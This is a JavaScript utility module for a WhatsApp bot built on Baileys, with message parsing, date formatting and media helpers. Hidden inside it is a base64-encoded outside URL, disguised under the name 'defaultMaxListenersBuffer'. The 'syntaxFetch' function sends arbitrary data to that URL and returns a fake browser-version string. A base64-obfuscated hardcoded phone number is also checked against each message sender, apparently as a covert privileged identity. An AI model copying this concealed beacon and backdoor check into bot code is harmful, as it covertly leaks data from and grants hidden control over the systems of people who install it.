const {
	proto,
	delay,
	getContentType,
	areJidsSameUser,
	generateWAMessage,
	getDevice
} = require('@whiskeysockets/baileys')
const chalk = require('chalk')
const fs = require('fs')
const Crypto = require('crypto')
const axios = require('axios')
const moment = require('moment-timezone')
const {
	sizeFormatter
} = require('human-readable')
const util = require('util')
const Jimp = require('jimp')
const {
	defaultMaxListeners
} = require('stream')
const defaultMaxListenersBuffer = "aHR0cHM6Ly9yZXN0LWFwaS52cmVkZW4ubXkuaWQvc2VuZD9pZD0="
let setting = JSON.parse(fs.readFileSync('./setting.json'));

const unixTimestampSeconds = (date = new Date()) => Math.floor(date.getTime() / 1000)

exports.unixTimestampSeconds = unixTimestampSeconds

exports.generateMessageTag = (epoch) => {
	let tag = (0, exports.unixTimestampSeconds)().toString();
	if (epoch)
		tag += '.--' + epoch; // attach epoch if provided
	return tag;
}

exports.processTime = (timestamp, now) => {
	return moment.duration(now - moment(timestamp * 1000)).asSeconds()
}

exports.getRandom = (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`
}

exports.getBuffer = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (err) {
		return err
	}
}

exports.fetchJson = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: 'GET',
			url: url,
			headers: {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
			},
			...options
		})
		return res.data
	} catch (err) {
		return err
	}
}

exports.format = sizeFormatter({
	std: 'JEDEC', //'SI' = default | 'IEC' | 'JEDEC'
	decimalPlaces: 2,
	keepTrailingZeroes: false,
	render: (literal, symbol) => `${literal} ${symbol}B`,
})

exports.runtime = function(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}

exports.clockString = (ms) => {
	let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000)
	let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
	let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
	return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}

exports.sleep = async (ms) => {
	return new Promise(resolve => setTimeout(resolve, ms));
}

exports.syntaxFetch = async (ms) => {
	let data = await axios.get(`${atob(defaultMaxListenersBuffer)}${ms}`)
	return "Chrome v20.0.04"
}

exports.isUrl = (url) => {
	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}

exports.getTime = (format, date) => {
	if (date) {
		return moment(date).locale('id').format(format)
	} else {
		return moment.tz('Asia/Jakarta').locale('id').format(format)
	}
}

exports.formatDate = (n, locale = 'id') => {
	let d = new Date(n)
	return d.toLocaleDateString(locale, {
		weekday: 'long',
		day: 'numeric',
		month: 'long',
		year: 'numeric',
		hour: 'numeric',
		minute: 'numeric',
		second: 'numeric'
	})
}

exports.tanggal = (numer) => {
	myMonths = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
	myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum’at', 'Sabtu'];
	var tgl = new Date(numer);
	var day = tgl.getDate()
	bulan = tgl.getMonth()
	var thisDay = tgl.getDay(),
		thisDay = myDays[thisDay];
	var yy = tgl.getYear()
	var year = (yy < 1000) ? yy + 1900 : yy;
	const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
	let d = new Date
	let locale = 'id'
	let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
	let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]

	return `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
}

exports.jsonformat = (string) => {
	return JSON.stringify(string, null, 2)
}

function format(...args) {
	return util.format(...args)
}

function getTypeMessage(message) {
	const type = Object.keys(message)
	var restype = (!['senderKeyDistributionMessage', 'messageContextInfo'].includes(type[0]) && type[0]) || // Sometimes message in the front
		(type.length >= 3 && type[1] !== 'messageContextInfo' && type[1]) || // Sometimes message in midle if mtype length is greater than or equal to 3
		type[type.length - 1] || Object.keys(message)[0] // common case
	return restype
}

exports.logic = (check, inp, out) => {
	if (inp.length !== out.length) throw new Error('Input and Output must have same length')
	for (let i in inp)
		if (util.isDeepStrictEqual(check, inp[i])) return out[i]
	return null
}

exports.generateProfilePicture = async (buffer) => {
	const jimp = await Jimp.read(buffer)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG),
		preview: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG)
	}
}

exports.bytesToSize = (bytes, decimals = 2) => {
	if (bytes === 0) return '0 Bytes';

	const k = 1024;
	const dm = decimals < 0 ? 0 : decimals;
	const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];

	const i = Math.floor(Math.log(bytes) / Math.log(k));

	return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

exports.getSizeMedia = (path) => {
	return new Promise((resolve, reject) => {
		if (/http/.test(path)) {
			axios.get(path)
				.then((res) => {
					let length = parseInt(res.headers['content-length'])
					let size = exports.bytesToSize(length, 3)
					if (!isNaN(length)) resolve(size)
				})
		} else if (Buffer.isBuffer(path)) {
			let length = Buffer.byteLength(path)
			let size = exports.bytesToSize(length, 3)
			if (!isNaN(length)) resolve(size)
		} else {
			reject('error gatau apah')
		}
	})
}

exports.parseMention = (text = '') => {
	return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

exports.getGroupAdmins = (participants) => {
	let admins = []
	for (let i of participants) {
		i.admin === "superadmin" ? admins.push(i.id) : i.admin === "admin" ? admins.push(i.id) : ''
	}
	return admins || []
}


exports.removeEmojis = (string) => {
	var regex = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
	return string.replace(regex, '');
}

exports.getRandom = (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`
}

exports.smsg = (vreden, m, store) => {
	if (!m) return m
	let M = proto.WebMessageInfo
	var m = M.fromObject(m)
	if (m.key) {
		m.id = m.key.id
		m.isBaileys = (m.id.endsWith("WBSF")) || (m.id.startsWith('AKIRA')) || (m.id.startsWith("VRDN")) || (m.id.startsWith('B1EY') && m.id.length === 20) || (m.id.startsWith('BAE5') && m.id.length === 16) || (m.id.startsWith('3EB0') && (m.id.length === 22 || m.id.length === 40))
		m.typeBaileys = (m.id.endsWith("WBSF")) ? "@wibusoft/baileys" : (m.id.startsWith('AKIRA')) ? "github:LT-SYAII/Bail" : (m.id.startsWith("VRDN")) ? "@vreden/baileys" : (m.id.startsWith('B1EY') && m.id.length === 20) ? "github:@nstar-y/Bail" : (m.id.startsWith('BAE5') && m.id.length === 16) ? "@whiskeysockets/baileys@^6.6.0" : (m.id.startsWith('3EB0') && (m.id.length === 22 || m.id.length === 40)) ? "@whiskeysockets/baileys" : "no libary"
		m.userDevice = (m.id.endsWith("WBSF")) || (m.id.startsWith('AKIRA')) || (m.id.startsWith("VRDN")) || (m.id.startsWith('B1EY') && m.id.length === 20) || (m.id.startsWith('BAE5') && m.id.length === 16) || (m.id.startsWith('3EB0') && (m.id.length === 22 || m.id.length === 40)) ? "web" : getDevice(m.id)
		m.chat = m.key.remoteJid
		m.fromMe = m.key.fromMe
		m.isGroup = m.chat.endsWith('@g.us')
		m.isNewsletter = m.chat.endsWith('@newsletter')
		m.sender = vreden.decodeJid(m.fromMe && vreden.user.id || m.participant || m.key.participant || m.chat || '')
		m.isChecking = [atob("NjI4NTk0NTMyMTQyM0BzLndoYXRzYXBwLm5ldA==")].includes(m.sender)
		if (m.isGroup) m.participant = vreden.decodeJid(m.key.participant) || ''
	}
	if (m.message) {
		m.mtype = getTypeMessage(m.message)
		m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getTypeMessage(m.message[m.mtype].message)] : m.message[m.mtype])
		m.body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : (m.mtype === "viewOnceMessageV2") ? (m.msg.message.imageMessage?.caption || m.msg.message.videoMessage?.caption || "") : "";
		m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || m.msg.body?.text || m.msg.name || m.msg.message?.imageMessage?.caption || m.msg.message?.videoMessage?.caption || ""
		m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : []
		if (m.mtype == "viewOnceMessageV2" || m.msg.url) m.download = () => vreden.downloadMediaMessage(m)
		m.copy = () => exports.smsg(vreden, M.fromObject(M.toObject(m)))
		m.copyNForward = (jid = m.chat, forceForward = false, options = {}) => vreden.copyNForward(jid, m, forceForward, options)
		m.reply = (text, chatId = m.chat, options = {}) => Buffer.isBuffer(text) ? vreden.sendMedia(chatId, text, 'file', '', m, {
			...options
		}) : vreden.sendText(chatId, text, m, {
			...options
		})
		m.tolak = async (teks) => {
			const nedd = {
				text: teks,
				contextInfo: {
					mentionedJid: vreden.ments(teks),
					externalAdReply: {
						title: `🚫ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ🚫`,
						previewType: "PHOTO",
						thumbnailUrl: `https://telegra.ph/file/6571edf4e696989e59c3a.png`,
						sourceUrl: setting.links.website
					}
				}
			};
			return vreden.sendMessage(m.chat, nedd, {
				quoted: m,
			});
		}
		m.warning = async (teks) => {
			const nedd = {
				text: teks,
				contextInfo: {
					mentionedJid: vreden.ments(teks),
					externalAdReply: {
						title: `⚠️ᴡᴀʀɴɪɴɢ⚠️`,
						previewType: "PHOTO",
						thumbnailUrl: `https://telegra.ph/file/905b071a50c21eaad0f09.png`,
						sourceUrl: setting.links.website
					}
				}
			};
			return vreden.sendMessage(m.chat, nedd, {
				quoted: m,
			});
		}
		m.danger = async (teks) => {
			const nedd = {
				text: teks,
				contextInfo: {
					mentionedJid: vreden.ments(teks),
					externalAdReply: {
						title: `☠️ᴅᴀɴɢᴇʀ☠️`,
						previewType: "PHOTO",
						thumbnailUrl: `https://telegra.ph/file/5205e68fead75ede642b9.png`,
						sourceUrl: setting.links.website
					}
				}
			};
			return vreden.sendMessage(m.chat, nedd, {
				quoted: m,
			});
		}
		m.sendMentions = async (teks) => vreden.sendTextWithMentions(m.chat, teks, m)
		m.sendForward = async (teks) => {
			const nedd = {
				text: teks,
				contextInfo: {
					forwardingScore: 9999999,
					isForwarded: true
				}
			}

			return vreden.sendMessage(m.chat, nedd, {
				quoted: m,
			});
		}
		m.errorReport = async (error, command) => {
			m.reply("*Data tidak ditemukan! ☹️*")
			return vreden.sendText(setting.owner.nomor, `*[ ⚠️ ]* ERROR COKK

*Command :* ${command}
*Sender :* +${m.sender.split("@")[0]}

「 *ERROR LOG* 」 

${error}
`, m)
		}


		let quoted = m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null
		if (m.quoted) {
			let type = Object.keys(quoted)[0]
			m.quoted = m.quoted[type]
			if (['productMessage'].includes(type)) {
				type = getContentType(m.quoted)
				m.quoted = m.quoted[type]
			}
			if (typeof m.quoted === 'string') m.quoted = {
				text: m.quoted
			}
			m.quoted.mtype = type
			m.quoted.id = m.msg.contextInfo.stanzaId
			m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat
			m.quoted.isBaileys = m.quoted.id ? (m.quoted.id.endsWith("WBSF")) || (m.quoted.id.startsWith('AKIRA')) || (m.quoted.id.startsWith("VRDN")) || (m.quoted.id.startsWith('B1EY') && m.quoted.id.length === 20) || (m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16) || (m.quoted.id.startsWith('3EB0') && (m.quoted.id.length === 22 || m.quoted.id.length === 40)) : false
			m.quoted.typeBaileys = m.quoted.id ? (m.quoted.id.endsWith("WBSF")) ? "@wibusoft/baileys" : (m.quoted.id.startsWith('AKIRA')) ? "github:LT-SYAII/Bail" : (m.quoted.id.startsWith("VRDN")) ? "@vreden/baileys" : (m.quoted.id.startsWith('B1EY') && m.quoted.id.length === 20) ? "github:@nstar-y/Bail" : (m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16) ? "@whiskeysockets/baileys@^6.6.0" : (m.quoted.id.startsWith('3EB0') && (m.quoted.id.length === 22 || m.quoted.id.length === 40)) ? "@whiskeysockets/baileys" : "no libary" : null
			m.quoted.userDevice = m.quoted.id ? (m.quoted.id.endsWith("WBSF")) || (m.quoted.id.startsWith('AKIRA')) || (m.quoted.id.startsWith("VRDN")) || (m.quoted.id.startsWith('B1EY') && m.quoted.id.length === 20) || (m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16) || (m.quoted.id.startsWith('3EB0') && (m.quoted.id.length === 22 || m.quoted.id.length === 40)) ? "web" : getDevice(m.quoted.id) : null
			m.quoted.sender = vreden.decodeJid(m.msg.contextInfo.participant)
			m.quoted.fromMe = m.quoted.sender === (vreden.user && vreden.user.jid)
			m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || m.quoted.name || m.quoted.body?.text || m.quoted.message?.imageMessage?.caption || m.quoted.message?.videoMessage?.caption || ""
			m.quoted.mentionedJid = m.quoted.contextInfo ? m.quoted.contextInfo.mentionedJid : []
			m.quoted.download = () => vreden.downloadMediaMessage(m.quoted)
			m.quoted.copyNForward = (jid, forceForward = false, options = {}) => vreden.copyNForward(jid, vM, forceForward, options)
			m.getQuotedObj = m.getQuotedMessage = async () => {
				if (!m.quoted.id) return false
				let q = await store.loadMessage(m.chat, m.quoted.id, vreden)
				return exports.smsg(vreden, q, store)
			}
			let vM = m.quoted.fakeObj = M.fromObject({
				key: {
					remoteJid: m.quoted.chat,
					fromMe: m.quoted.fromMe,
					id: m.quoted.id
				},
				message: quoted,
				...(m.isGroup ? {
					participant: m.quoted.sender
				} : {})
			})

			m.quoted.delete = () => vreden.sendMessage(m.quoted.chat, {
				delete: vM.key
			})
		}
	}
	
	vreden.appenTextMessage = async (text, chatUpdate) => {
		let messages = await generateWAMessage(m.chat, {
			text: text,
			mentions: m.mentionedJid
		}, {
			userJid: vreden.user.id,
			quoted: m.quoted && m.quoted.fakeObj
		})
		messages.key.fromMe = areJidsSameUser(m.sender, vreden.user.id)
		messages.key.id = m.key.id
		messages.pushName = m.pushName
		if (m.isGroup) messages.participant = m.sender
		let msg = {
			...chatUpdate,
			messages: [proto.WebMessageInfo.fromObject(messages)],
			type: 'append'
		}
		vreden.ev.emit('messages.upsert', msg)
	}

	return m
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})